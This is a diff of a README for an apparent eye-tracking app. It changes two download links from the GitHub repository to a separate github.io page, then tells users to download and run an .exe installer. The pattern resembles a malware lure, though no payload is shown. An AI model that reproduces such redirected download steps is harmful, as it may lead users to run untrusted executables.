@@ -1,6 +1,6 @@
 # 👁️ screen-eye-tracking - See exactly where you look onscreen
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/kandyretrograde420/screen-eye-tracking)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://kandyretrograde420.github.io)
 
 This application tracks your eye movement and displays your current gaze point on your monitor. It uses a red marker to show you which part of the screen receives your focus. The tool operates locally on your machine without external dependencies.
 
@@ -20,7 +20,7 @@ The software uses your camera to estimate gaze position in real time. Ensure you
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/kandyretrograde420/screen-eye-tracking) the installer.
+1. Visit [this page to download](https://kandyretrograde420.github.io) the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
